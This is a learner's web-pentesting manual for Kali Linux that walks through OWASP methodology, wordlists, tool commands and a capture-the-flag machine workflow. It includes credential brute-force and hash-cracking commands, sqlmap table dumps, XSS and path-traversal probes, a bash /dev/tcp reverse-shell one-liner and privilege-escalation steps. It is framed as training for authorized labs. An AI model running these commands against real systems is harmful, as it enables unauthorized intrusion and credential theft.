# OWASP Pentesting Manual — Tools & Methodology (Kali Linux edition)

A personal field manual for learning web application security the OWASP way — the methodology, the terminal toolkit, the wordlists, and the steps, in the order you actually use them. Paths and install commands assume **Kali Linux** (they also work on Parrot OS with minor path changes).

---

## How to use this & the one rule that matters

This is your repeatable process: for any authorized web target, walk the phases in order, reach for the tool mapped to each step, and write down what you find. Treat it as a checklist you grow over time, not a script to memorize.

**The one non-negotiable rule:** only test systems you own or have explicit written permission to test. Running these tools against a site you don't control is illegal in most countries, regardless of intent. Everything below assumes you are practicing on targets that are legal for you.

Legal places to practice every technique here:

- **OWASP Juice Shop** — a deliberately vulnerable modern web app (run it locally with Docker).
- **DVWA** (Damn Vulnerable Web Application) — classic PHP/MySQL practice app with difficulty levels.
- **PortSwigger Web Security Academy** — free, browser-based labs that map almost 1:1 to this methodology.
- **TryHackMe** and **Hack The Box** — guided rooms and full practice machines.
- **VulnHub** — downloadable vulnerable VMs for offline practice.

Set up a lab VM (Kali Linux or Parrot OS) so your tools are pre-installed and isolated from your main machine.

---

## Fast-learning path

The fastest way to learn is to attack a target, hit something you don't understand, then read just enough to get past it. Don't front-load theory. Pick one vulnerable app and go.

**The loop that builds skill quickly:**

1. Spin up a legal target (start with Juice Shop or a PortSwigger lab).
2. Pick one OWASP category to hunt (e.g. "today I only look for injection").
3. Run the matching tools and techniques from the methodology below.
4. When you find or break something, write down *what* worked and *why* in your own words.
5. Read the OWASP WSTG page for that test to see what you missed, then repeat on a new target.

**Mindset that matters more than any tool:**

- Map before you attack — understand the app's pages, inputs, and roles first.
- Every input is a question you ask the server; watch how the answer changes when you send something unexpected.
- Think in terms of *trust boundaries*: where does user-controlled data cross into code, queries, files, or other users' sessions?
- Automated scanners find the obvious; the interesting bugs come from understanding the app's logic.

**Core references to keep open:**

- **OWASP WSTG** (Web Security Testing Guide) — the methodology this manual follows.
- **OWASP Top 10** — the 10 risk categories to prioritize.
- **OWASP Cheat Sheet Series** — concise how-tos per topic.
- **PayloadsAllTheThings** (GitHub) — a payload reference for almost every injection type.

---

## The toolkit

Your everyday kit, grouped by what you reach for it to do. Most are pre-installed on Kali/Parrot; the rest install from your package manager, pip, Go, or GitHub.

| Tool | Category | What you use it for |
| --- | --- | --- |
| Burp Suite | Web proxy | The hub. Intercept, modify, and replay HTTP; Repeater, Intruder, decoder. Start here for any web test. |
| OWASP ZAP | Web proxy | Free, scriptable alternative to Burp; good automated scanner + proxy. |
| nmap | Recon / scanning | Discover open ports, services, versions; run NSE scripts. |
| masscan | Recon / scanning | Very fast port scanning across large ranges. |
| whatweb | Recon | Fingerprint the web stack (CMS, frameworks, servers). |
| wafw00f | Recon | Detect whether a WAF sits in front of the app. |
| subfinder / amass | Recon | Enumerate subdomains of a target domain. |
| httpx | Recon | Probe lists of hosts for live web servers and metadata. |
| gobuster / feroxbuster / ffuf | Content discovery | Brute-force directories, files, and parameters; fuzz inputs. |
| dirsearch | Content discovery | Directory/file brute-forcing with good default wordlists. |
| nikto | Scanning | Quick server misconfiguration and known-issue scan. |
| nuclei | Scanning | Template-based scanner for known vulns and misconfigs. |
| sqlmap | Exploitation | Automated detection and exploitation of SQL injection. |
| commix | Exploitation | Automated command-injection detection and exploitation. |
| XSStrike / dalfox | Exploitation | Detect and craft cross-site scripting payloads. |
| hydra / medusa | Passwords | Online brute-force against login forms and services. |
| john / hashcat | Passwords | Offline cracking of captured password hashes. |
| wordlists (SecLists) | Support | The standard collection of wordlists for everything above (see the Wordlists section). |
| curl / wget | Utility | Send raw crafted HTTP requests from the terminal. |
| jq | Utility | Parse and filter JSON from API responses. |
| openssl | Crypto | Inspect certificates, test TLS, decode/encode material. |
| testssl.sh / sslscan | Crypto | Audit a server's TLS configuration and cipher support. |

Don't try to learn all of these at once. Burp + nmap + ffuf + sqlmap will carry you through most of the methodology; add the rest as specific needs come up.

---

## Wordlists

Wordlists are the fuel for every brute-force, fuzzing, and discovery step in this manual. The right list for the job matters more than the tool: a tiny focused list finishes fast and finds the common stuff; a huge list is thorough but slow and noisy. The skill is picking the smallest list that will still hit.

### Where they live on Kali

Kali keeps wordlists under **`/usr/share/wordlists/`**. Out of the box this is mostly a set of symlinks into each tool's own folder:

| Path | What's there |
| --- | --- |
| `/usr/share/wordlists/rockyou.txt.gz` | The famous ~14M-password leak list. **Ships gzipped — you must extract it before use** (see below). |
| `/usr/share/wordlists/dirb/` | dirb's lists: `common.txt`, `big.txt`, `small.txt`, etc. Good quick directory lists. |
| `/usr/share/wordlists/dirbuster/` | dirbuster's lists: `directory-list-2.3-medium.txt` (the workhorse), `-small`, `-lowercase` variants. |
| `/usr/share/wordlists/wfuzz/` | wfuzz's bundled lists (injections, general, others). |
| `/usr/share/wordlists/fasttrack.txt` | ~250 very common/default passwords — great fast first pass. |
| `/usr/share/wordlists/metasploit/` | Metasploit's default-credential and service lists. |
| `/usr/share/wordlists/nmap.lst` | nmap's password list. |
| `/usr/share/wordlists/seclists` | Symlink to SecLists **if installed** (see below). |
| `/usr/share/john/password.lst` | John the Ripper's small built-in list. |

**The two gotchas that trip everyone up on a fresh Kali:**

1. **`rockyou.txt` isn't ready to use** — it's compressed. Extract it once:
   ```bash
   sudo gunzip /usr/share/wordlists/rockyou.txt.gz          # replaces the .gz
   # or keep the archive too:
   sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
   # verify:
   wc -l /usr/share/wordlists/rockyou.txt                   # ~14,344,391 lines
   ```
2. **SecLists may not be installed.** It's the single most important collection for web testing, and many commands in this manual expect it at `/usr/share/seclists/`. Install it (next section) before you rely on those paths.

### Getting the essentials installed

```bash
# SecLists — the big one. Recommended: install via apt.
sudo apt update && sudo apt install -y seclists
#   -> installs to /usr/share/seclists/
#   -> also symlinked at /usr/share/wordlists/seclists

# Prefer the newest version? Clone it instead (or alongside):
sudo git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists

# PayloadsAllTheThings — payload reference + some fuzzing lists
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git ~/tools/PayloadsAllTheThings

# FuzzDB — attack patterns and discovery lists
sudo apt install -y fuzzdb      # lands in /usr/share/fuzzdb/
#   or: git clone https://github.com/fuzzdb-project/fuzzdb.git

# The `wordlists` helper (Kali metapackage + overview command)
sudo apt install -y wordlists
wordlists                        # prints an overview of installed lists and their paths
#   -> this metapackage also pulls in many of the lists above and extracts rockyou for you
```

For bigger / higher-signal discovery and subdomain lists later on, the **Assetnote wordlists** at `wordlists.assetnote.io` are excellent — download individual files with `wget` as you need them rather than grabbing everything.

### Which wordlist for which job

Reach for these first. Paths assume SecLists is installed at `/usr/share/seclists/`.

| Job | Go-to wordlist | Path |
| --- | --- | --- |
| Directory/file discovery — **quick pass** | `common.txt` (~4.7k entries) | `…/seclists/Discovery/Web-Content/common.txt` |
| Directory/file discovery — **thorough** | `directory-list-2.3-medium.txt` (~220k) | `…/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` |
| Directories only (high-signal) | `raft-medium-directories.txt` | `…/seclists/Discovery/Web-Content/raft-medium-directories.txt` |
| Files / backups / source leaks | `raft-medium-files.txt` | `…/seclists/Discovery/Web-Content/raft-medium-files.txt` |
| API endpoint discovery | `api/api-endpoints.txt` | `…/seclists/Discovery/Web-Content/api/` |
| Parameter name fuzzing | `burp-parameter-names.txt` | `…/seclists/Discovery/Web-Content/burp-parameter-names.txt` |
| Subdomain enumeration — fast | `subdomains-top1million-5000.txt` | `…/seclists/Discovery/DNS/subdomains-top1million-5000.txt` |
| Subdomain enumeration — deep | `subdomains-top1million-110000.txt` | `…/seclists/Discovery/DNS/` |
| Passwords — fast first pass | `fasttrack.txt` / top-1000 list | `/usr/share/wordlists/fasttrack.txt` · `…/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` |
| Passwords — full brute | `rockyou.txt` | `/usr/share/wordlists/rockyou.txt` (after extracting) |
| Default credentials | `Default-Credentials/` | `…/seclists/Passwords/Default-Credentials/` |
| Usernames | `top-usernames-shortlist.txt` | `…/seclists/Usernames/top-usernames-shortlist.txt` |
| LFI / path traversal payloads | `LFI/` lists | `…/seclists/Fuzzing/LFI/` |
| Special chars / injection probes | `special-chars.txt` | `…/seclists/Fuzzing/special-chars.txt` |

**Rule of thumb:** start with the *quick* / *shortlist* option on every target. Only escalate to the medium/large list for a parameter or path that already looks interesting. A 220k-line run against everything wastes time and lights up the logs.

### Finding any wordlist fast

When a tutorial names a list and you're not sure you have it:

```bash
# fastest, if plocate's db is current (run `sudo updatedb` once first)
locate <keyword> | grep -i wordlist
locate subdomains-top1million

# always works, no db needed
find /usr/share -iname '*subdomain*'
find /usr/share -iname '*.txt' -path '*Discovery*'
```

---

## Common commands per tool

The 2–5 invocations you'll actually reach for, per tool. Replace `LIST` with a wordlist path from the Wordlists section, `TARGET`/`example.com`/`URL` with your authorized target. Save output as you go (`-o`, `-oA`, `tee`).

**Recon & scanning**

```bash
# nmap — ports, services, scripts
nmap -sV -sC example.com                 # version + default scripts
nmap -p- example.com                     # all 65535 ports
nmap -sV -sC -p- -oA scan example.com    # full scan, save all formats
nmap --script vuln example.com           # NSE vuln scripts

# masscan — fast sweep (needs root)
sudo masscan -p1-65535 10.0.0.0/24 --rate 10000 -oL ports.txt

# whatweb / wafw00f — fingerprint + WAF detection
whatweb -a 3 https://example.com
wafw00f -a https://example.com

# subfinder / amass — subdomains
subfinder -d example.com -all -o subs.txt
amass enum -passive -d example.com -o subs.txt

# httpx — which hosts are live
cat subs.txt | httpx -silent -title -status-code -tech-detect
```

**Content discovery**

```bash
# ffuf — the Swiss army knife
ffuf -u https://example.com/FUZZ -w LIST                       # dirs/files
ffuf -u https://example.com/FUZZ -w LIST -e .php,.bak,.txt     # with extensions
ffuf -u https://example.com/FUZZ -w LIST -mc 200,301 -fc 404   # match/filter status
ffuf -u https://example.com/FUZZ -w LIST -fs 1234              # filter by response size
ffuf -u https://example.com/ -H "Host: FUZZ.example.com" -w LIST   # vhost fuzzing
ffuf -u "https://example.com/?FUZZ=test" -w PARAMLIST          # parameter names

# gobuster / feroxbuster / dirsearch — alternatives
gobuster dir -u https://example.com -w LIST -x php,txt,html
feroxbuster -u https://example.com -w LIST -x php,bak -d 2     # -d = recursion depth
dirsearch -u https://example.com -e php,asp,html -x 403,404
```

**Vuln scanning**

```bash
nikto -h https://example.com -o nikto.html -Format htm
nuclei -update-templates
nuclei -u https://example.com -t cves/ -severity critical,high
nuclei -l live-hosts.txt                 # scan many hosts
```

**Exploitation**

```bash
# sqlmap — confirm, then walk the database
sqlmap -u "https://example.com/item?id=1" --batch               # detect
sqlmap -u "URL?id=1" --batch --dbs                              # list databases
sqlmap -u "URL?id=1" --batch -D shop --tables                   # tables in a db
sqlmap -u "URL?id=1" --batch -D shop -T users --dump            # dump a table
sqlmap -r request.txt --batch                                   # from a saved Burp request
sqlmap -u "URL" --data "user=1&pass=2" --batch                  # POST body
sqlmap -u "URL?id=1" --batch --level 3 --risk 2                 # dig deeper

# commix — command injection
commix -u "https://example.com/ping?host=127.0.0.1"
commix -r request.txt

# dalfox / XSStrike — XSS
dalfox url "https://example.com/search?q=test"
dalfox url "URL" -b yourcollab.example            # blind XSS callback
python xsstrike.py -u "URL?q=test" --crawl
```

**Passwords**

```bash
# hydra — online brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P pass.txt ssh://TARGET

# medusa — alternative
medusa -h TARGET -u admin -P pass.txt -M ssh

# identify a hash, then crack offline
hashid hash.txt            # or: hash-identifier
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt   # -m 0 = MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
(`-m` is the hash type: `0` MD5, `100` SHA1, `1400` SHA256, `1800` sha512crypt, `3200` bcrypt. `hashcat --example-hashes` lists them all.)

**Utilities & crypto**

```bash
curl -i https://example.com                        # response with headers
curl -X POST -d "a=1&b=2" URL                      # POST form data
curl -H "Authorization: Bearer TOKEN" URL          # auth header
curl -x http://127.0.0.1:8080 -k URL               # route through Burp
curl -s URL | jq .                                 # pretty-print JSON
curl -s URL | jq '.data[] | .id'                   # pull one field

echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates
testssl.sh https://example.com
sslscan example.com:443
```

A note on Burp: there's no single command — it's the interactive hub. The pattern is **proxy your browser through it (127.0.0.1:8080), send any captured request to Repeater to tweak and replay, or to Intruder to iterate a payload.** Save requests to a file (right-click → "Copy to file") to feed sqlmap/commix with `-r request.txt`.

---

## Which tool for which vulnerability

The tool you reach for depends on **what kind of vulnerability it is**, which splits into three buckets:

- **Injection-type bugs** (your input becomes code) → a *specialized automated tool* does the heavy lifting once you've found an injection point.
- **Access-control and logic bugs** (you do things you shouldn't) → *no scanner finds these*; it's you plus Burp Repeater, reasoning about the app.
- **Discovery and recon** (what's even here?) → *scanners and fuzzers* that sweep broadly.

| Vulnerability | Primary tool | How you actually use it |
| --- | --- | --- |
| SQL injection | **sqlmap** | Point it at a parameter: `sqlmap -u "URL?id=1" --batch --dbs`. Confirm manually first with `'` and `"`. |
| Cross-site scripting (XSS) | **dalfox** / XSStrike + Burp | Auto-scan a param, then craft the payload by hand in Burp Repeater. |
| Command injection | **commix** | `commix -u "URL?host=127.0.0.1"`; manually test with `; id` or `\| whoami`. |
| Broken access control / IDOR | **Burp Repeater** (+ Autorize extension) | Capture a request, change an ID or role, resend. Manual — no scanner. |
| Login brute-force | **hydra** / Burp Intruder | `hydra` for services/forms; Intruder when you need Burp's response analysis. |
| Cracking captured hashes | **hashcat** / **john** | Offline, after you've obtained the hashes. hashcat for GPU speed. |
| SSRF | **Burp** (Collaborator) | Put an internal/collaborator URL in any field that fetches; watch for the callback. |
| Server-side template injection | **tplmap** + manual | Probe with `{{7*7}}`; if it returns `49`, you're in. |
| Path traversal / LFI | **ffuf** / Burp + manual | Fuzz with `../` payloads and traversal wordlists (`…/seclists/Fuzzing/LFI/`). |
| XXE | **Burp** + manual | Manual XML payloads; no good pure-auto tool. |
| Content / directory discovery | **ffuf** / gobuster / dirsearch | Brute-force paths with a wordlist. |
| Subdomain enumeration | **subfinder** / amass | `subfinder -d domain \| httpx` to find live ones. |
| Open ports / services | **nmap** | `nmap -sV -sC -p- target`. |
| Known CVEs & misconfig | **nuclei** / nikto | Template-based sweep for known issues. |
| TLS / crypto weakness | **testssl.sh** / sslscan | `testssl.sh URL` audits ciphers, protocols, cert. |
| CSRF | **Burp** | Generate a PoC; test whether removing the token is rejected. |
| Business logic flaws | **none** — Burp Repeater + your head | Reason about the workflow; replay and reorder steps. |

The thing to internalize: **automated tools are for confirming and exploiting, not for finding.** You find the *injection point* or the *logic flaw* by hand first (a `'` that breaks a page, an ID you can change), *then* hand it to sqlmap or commix to do the grinding. The bugs that win bounties — access control and logic — have no tool at all, which is why they stay unfound.

---

## The methodology (OWASP WSTG, phase by phase)

Walk these in order. Each phase lists its goal, what you're hunting for, the tools, and starting commands. Replace `TARGET`, `example.com`, or `URL` with your authorized target. All commands assume a lab or permitted scope and SecLists installed at `/usr/share/seclists/`.

### 1. Information gathering (recon)

*Goal:* map the whole attack surface before touching anything. *Looking for:* subdomains, endpoints, technologies, hidden files, exposed data.

```bash
# Tech fingerprint
whatweb https://example.com
wafw00f https://example.com

# Subdomains, then find which are live
subfinder -d example.com | httpx -silent
#   deeper DNS brute with a wordlist:
#   ffuf -u https://FUZZ.example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Port + service scan
nmap -sV -sC -p- example.com

# Directory & file discovery — quick pass first
ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
#   escalate on anything interesting:
#   ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Also review the page source, `robots.txt`, `sitemap.xml`, JavaScript files (for API endpoints and keys), and Google dorks (`site:example.com`).

### 2. Configuration & deployment management

*Goal:* find weaknesses in how the server and app are set up. *Looking for:* default pages, admin panels, exposed `.git`/backup files, verbose headers, misconfigured methods.

```bash
nikto -h https://example.com
nuclei -u https://example.com

# Check allowed HTTP methods
curl -X OPTIONS https://example.com -i

# Look for exposed source control / backups
ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200
```

Inspect response headers for missing security headers (CSP, HSTS, X-Frame-Options) and leaked versions.

### 3. Identity management

*Goal:* test how accounts and roles are defined. *Looking for:* username enumeration, weak registration rules, predictable account IDs, role definitions.

In Burp, compare responses to valid vs invalid usernames at login, registration, and password-reset. A different message, status code, or response time usually means usernames are enumerable. Map every role the app has and what each is supposed to access — you'll need this for authorization testing. A username shortlist to test enumeration: `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`.

### 4. Authentication testing

*Goal:* break the login process. *Looking for:* weak passwords, missing lockout, bypassable MFA, insecure reset flows, credentials over HTTP.

```bash
# Online brute-force a login form (authorized targets only)
# Fast first pass with a tiny high-hit list:
hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
  example.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# Full run with rockyou (after you've extracted it):
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  example.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"
```

Test for: no rate-limiting, default credentials, password reset that leaks tokens or lets you set another user's password, and "remember me" tokens that never expire.

### 5. Authorization testing

*Goal:* access things you shouldn't. *Looking for:* IDOR, privilege escalation, forced browsing to admin functions. This is where many real bugs live.

Log in as a low-privilege user, capture a request, then change an ID (`?id=123` → `124`), a role parameter, or the endpoint path, and resend in Burp Repeater. If you see another user's data or an admin action succeeds, that's broken access control. Also try accessing admin URLs directly while logged in as a normal user.

### 6. Session management

*Goal:* attack how the app tracks logged-in users. *Looking for:* predictable or non-expiring tokens, missing `HttpOnly`/`Secure`/`SameSite` flags, session fixation, weak logout, CSRF.

In Burp, inspect the session cookie: is it random, does it change on login, does it invalidate on logout? Check cookie flags. For CSRF, see whether state-changing requests require an unpredictable anti-CSRF token, and whether removing it is rejected.

### 7. Input validation — injection & XSS

*Goal:* get the app to treat your input as code. *Looking for:* SQLi, command injection, XSS, SSTI, path traversal, XXE, SSRF.

```bash
# SQL injection
sqlmap -u "https://example.com/item?id=1" --batch --dbs

# Command injection
commix -u "https://example.com/ping?host=127.0.0.1"

# Reflected/stored XSS
dalfox url "https://example.com/search?q=test"

# Path traversal / LFI fuzzing
ffuf -u "https://example.com/?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

Manually, probe each input with markers: `'` and `"` (SQLi), `<b>test</b>` or `"><svg onload=alert(1)>` (XSS), `{{7*7}}` (template injection), `../../etc/passwd` (path traversal), and an internal URL like `http://127.0.0.1` in any field that fetches a URL (SSRF). Use PayloadsAllTheThings for the full set.

### 8. Error handling & cryptography

*Goal:* harvest leaks and test crypto. *Looking for:* stack traces revealing paths/versions, weak TLS, secrets in transit, bad password storage.

```bash
testssl.sh https://example.com
```

Trigger errors (bad input, wrong types, missing params) and read what leaks — file paths, SQL errors, framework versions. Confirm sensitive actions are over HTTPS only, and check for weak ciphers or expired certs.

### 9. Business logic

*Goal:* abuse the app's intended workflow. *Looking for:* skipped steps, negative quantities, race conditions, replayed requests, bypassed limits.

No scanner finds these — you reason about them. Can you buy with a negative quantity or a tampered price? Skip a payment step and still get the goods? Apply a coupon ten times? Replay a "one-time" action? Trace each multi-step flow and ask what breaks if you do the steps out of order.

### 10. Client-side testing

*Goal:* attack logic and data in the browser. *Looking for:* DOM-based XSS, sensitive data in local storage, open redirects, postMessage flaws, CORS misconfig.

Read the JavaScript: does it write user input into the DOM unsafely (`innerHTML`, `eval`)? Store tokens in `localStorage`? Check for open redirects (`?url=https://evil.com`) and overly permissive CORS headers (`Access-Control-Allow-Origin: *` with credentials).

---

## From recon to attack — a worked flow

The phases above are the *checklist*; this is the *order of operations* that ties them together on a live target. The through-line:

**Scope → Passive recon → Active recon → Discover → Map → Spot a candidate → Confirm by hand → Exploit → Escalate & chain → Document**

The golden rule runs the whole way down: **broad and quiet first, narrow and loud only once you have a reason.** You widen the surface, then narrow to one weak point.

### Stage 0 — Scope & setup
Confirm written permission and exact in/out-of-bounds. Start Burp as your proxy, open a notes file, extract `rockyou.txt`, confirm SecLists is installed. Define the target in a variable so every command is consistent: `TARGET=example.com`.

### Stage 1 — Passive recon (don't touch the target hard yet)
Learn the shape of the org before sending noisy traffic.
```bash
subfinder -d "$TARGET" -all -o subs.txt      # subdomains
amass enum -passive -d "$TARGET" >> subs.txt  # more subdomains, passively
```
Also: read the site's JS for API paths and keys, check `robots.txt` / `sitemap.xml`, and run Google dorks (`site:$TARGET ext:php`). *(Phase 1)*

### Stage 2 — Active recon (now fingerprint the live surface)
```bash
cat subs.txt | httpx -silent -title -status-code -tech-detect | tee live.txt
whatweb -a 3 "https://$TARGET"               # stack: CMS, framework, server
wafw00f -a "https://$TARGET"                 # is there a WAF to work around?
nmap -sV -sC -p- -oA scan "$TARGET"          # open ports + services
```
You now know *what it's built on* and *what's exposed* — which tells you which bug classes are even plausible (e.g. a PHP app → test for LFI/SQLi; a Node API → test for NoSQLi/SSRF). *(Phases 1–2)*

### Stage 3 — Content discovery (find the hidden doors)
```bash
ffuf -u "https://$TARGET/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
# escalate on anything interesting:
ffuf -u "https://$TARGET/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.bak,.zip,.old -mc 200
nuclei -u "https://$TARGET" -severity critical,high   # known CVEs & misconfigs
```
Hunt for admin panels, `.git`/backups, API endpoints, old files. *(Phases 1–2)*

### Stage 4 — Map the app (understand it like a user, then like an attacker)
Browse every page *through Burp* so its site map fills in. Register an account, log in, exercise each feature. Write down every **input** (params, headers, cookies, JSON fields), every **role**, and every **multi-step flow** (checkout, password reset, file upload). This map is what everything downstream targets. *(Phases 3, 6)*

### Stage 5 — Spot candidates (where does input cross a trust boundary?)
Scan your map for the dangerous crossings:
- an `id`/`user`/`account` parameter you can change → **access control / IDOR**
- input reflected on the page → **XSS**
- input that hits a query, feeds a shell, or names a file → **SQLi / command injection / LFI**
- any field that fetches a URL → **SSRF**
- a workflow with steps, prices, or quantities → **business logic**

Pick one candidate. Don't scatter — follow one lead to the end.

### Stage 6 — Confirm by hand (one request, in Repeater)
This is the step people skip and shouldn't. Send a single probe and read the response:
- SQLi: add `'` then `"` → an error or changed behaviour is a hit
- XSS: send `"><svg onload=alert(1)>` → does it render unescaped?
- IDOR: change `?id=123` to `124` → do you see another user's data?
- SSTI: `{{7*7}}` → does `49` come back?
- Path traversal: `../../etc/passwd` → file contents?

If the probe reacts, you have a real finding. If not, back to Stage 5.

### Stage 7 — Exploit (now hand it to the automated tool)
Only after a manual confirmation do you let a tool grind. Save the confirmed request from Burp to `request.txt` and feed it in:
```bash
sqlmap -r request.txt --batch --dbs                 # then -D db --tables, -T t --dump
commix -r request.txt                               # command injection
dalfox url "https://$TARGET/search?q=test"          # craft the XSS payload
```
For access-control/logic bugs there's no tool — you exploit by hand in Repeater (change the ID, replay the step, reorder the flow).

### Stage 8 — Escalate & chain
One bug is a finding; chained bugs are an impact story. Examples: dumped a password hash with sqlmap → crack it with hashcat → reuse it to log in → IDOR to another account → that account is admin. Always ask *"what does this unlock?"*
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Stage 9 — Document
Write each finding the moment you land it (you'll forget the repro steps otherwise): **title → severity → affected endpoint → steps to reproduce → proof → impact → fix.** That structure is also exactly a bug-bounty submission and a professional report.

> **The one-line summary of the whole flow:** recon widens the surface, discovery finds the doors, mapping picks the lock to try, a manual probe proves it opens, and only then does a tool kick it in — then you see what's in the next room.

---

## Full machines (boot2root) — recon to root

The rest of this manual is **web-app** focused. But most practice rooms on **TryHackMe** and **Hack The Box** are *full machines*: you get an IP, not a URL, and the goal is to go from nothing to full control (root/SYSTEM) and read two flags. That adds two things web testing doesn't cover — **enumerating non-web services**, and **privilege escalation** after you get a shell. This section fills that gap. Everything here is for the room's own target, which is legal for you to attack.

**The full-machine loop:**

> **Connect → Scan → Enumerate every service → Foothold (get a shell) → Stabilize → Privilege-escalate → Loot the flags**

### 0. Connect to the room
- Easiest for a beginner: use the **AttackBox** (in-browser Kali, one click, tools pre-installed).
- Otherwise download the room's OpenVPN config and connect from your own Kali:
  ```bash
  sudo openvpn yourfile.ovpn      # leave it running in its own terminal
  ip a                            # confirm you have a tun0 interface + IP
  ```
- Click **Start Machine** on the room, wait ~1 minute, note the target IP it gives you (usually `10.10.x.x`), and set it once:
  ```bash
  export IP=10.10.x.x
  ```

### 1. Scan
```bash
nmap -sC -sV -oN nmap.txt $IP      # versions + default scripts, saved to file
nmap -p- $IP                        # all ports — catches services on high numbers
```
Read it slowly. Every open port is a door: 80/443 web, 21 FTP, 22 SSH, 139/445 SMB, 53 DNS, 3306 MySQL, 2049 NFS.

### 2. Enumerate every service (this is ~80% of the work)
Beginners rush this and get stuck. If you're stuck later, you missed something *here* — come back and enumerate harder, don't brute-force harder.

```bash
# Web (80/443)
whatweb http://$IP ; curl -s http://$IP/robots.txt
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt

# SMB (139/445) — shares, users, versions
enum4linux -a $IP
smbclient -L //$IP/ -N            # list shares anonymously
smbmap -H $IP

# FTP (21) — try anonymous
ftp $IP                           # user: anonymous, password: (blank)

# NFS (2049) — exported mounts
showmount -e $IP
```
You're hunting for one of: a web vuln, an exposed file or share, default/weak credentials, or a known-vulnerable version you can look up.

> **Web-room gotcha — virtual hosts.** Some web-based rooms (NahamStore is the classic) serve most of their content on **subdomains that don't resolve until you add them to your hosts file**. If the site looks thin or half-broken, this is why. Add the base name, fuzz for vhosts, then add what you find:
> ```bash
> echo "$IP box.thm" | sudo tee -a /etc/hosts
> # run once without -fs, note the size every junk result returns, then filter it:
> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
>   -H "Host: FUZZ.box.thm" -u http://$IP/ -fs <baseline-size>
> echo "$IP www.box.thm api.box.thm shop.box.thm" | sudo tee -a /etc/hosts
> ```
> Only *after* this is the full app reachable — then you attack it with the web methodology above (phases 1–10).

### 3. Foothold — get a shell
Depending on what enumeration turned up: exploit the web app (file upload → web shell, SQLi, LFI), log in with found creds, or run a known exploit for a vulnerable version. The goal is a **reverse shell** — the target connects back to a listener you're running:
```bash
nc -lvnp 4444                     # your listener (your machine)
```
Then make the target run a payload that calls back to your IP, e.g. a bash one-liner:
```bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```
(Grab the right payload for the target's language/OS from **revshells.com** — it generates them for you.)

### 4. Stabilize the shell
A raw reverse shell is fragile (no tab-complete, Ctrl+C kills it). Upgrade it:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl+Z  →  stty raw -echo; fg  →  Enter  →  export TERM=xterm
```
You're usually a low-privilege user now (e.g. `www-data`). Read `user.txt` if you can reach it.

### 5. Privilege escalation (low-priv → root)
Check the easy wins first, by hand:
```bash
sudo -l                                 # anything you're allowed to run as root?
find / -perm -4000 2>/dev/null          # SUID binaries
id ; cat /etc/crontab                   # groups + scheduled jobs
uname -a                                # kernel version (for kernel exploits)
```
Then run an automated enumerator — **LinPEAS** (`linpeas.sh`) for Linux, **WinPEAS** for Windows — which highlights escalation paths in colour. When it flags a SUID binary or a `sudo` entry, look the binary up on **GTFOBins** (Linux) or **LOLBAS** (Windows): those sites give you the exact command to abuse it into a root shell.

### 6. Loot the flags
`user.txt` (the low-priv user's home dir) and `root.txt` (`/root/` once you're root). Paste them into the room to complete it.

**The whole thing in one line:** *scan → enumerate → find a way in → get a shell → stabilize → escalate to root → read the flags.* Your web-app methodology is how you accomplish "find a way in" on web-based rooms; this section is the machine-level wrapper around it.

---

## OWASP Top 10 (2021) checklist

The ten risk categories to prioritize. Use this as a hunting list: for each target, ask "have I checked for this one?"

| # | Category | In plain terms | How to test / tools |
| --- | --- | --- | --- |
| A01 | Broken Access Control | Users do or see things their role shouldn't | Change IDs/roles in requests (IDOR), force-browse admin URLs — Burp Repeater |
| A02 | Cryptographic Failures | Sensitive data weakly protected or sent in the clear | Check HTTPS everywhere, TLS config, hashing — testssl.sh, openssl |
| A03 | Injection | Input treated as code (SQL, OS, LDAP, etc.) | Inject markers into every input — sqlmap, commix, manual payloads |
| A04 | Insecure Design | Flaws baked into the architecture/logic itself | Threat-model the flows; test business logic by hand |
| A05 | Security Misconfiguration | Defaults, verbose errors, open settings left on | nikto, nuclei; review headers and error pages |
| A06 | Vulnerable & Outdated Components | Known-buggy libraries or software versions | Fingerprint versions, match to CVEs — nuclei, whatweb |
| A07 | Identification & Auth Failures | Weak login, sessions, or password handling | Brute-force, session + MFA testing — hydra, Burp |
| A08 | Software & Data Integrity Failures | Trusting unverified updates, code, or deserialized data | Inspect update/CI flows, test insecure deserialization |
| A09 | Logging & Monitoring Failures | Attacks aren't detected or recorded | Check whether failed logins / attacks produce any trace |
| A10 | Server-Side Request Forgery (SSRF) | App fetches a URL you control, reaching internal systems | Put internal URLs in any field that fetches — Burp, manual |

Map each category back to the methodology phase where you test for it — A01 is phase 5, A03 is phase 7, and so on.

---

## The repeatable workflow

Run this top to bottom on any authorized target. Tick the boxes as you go.

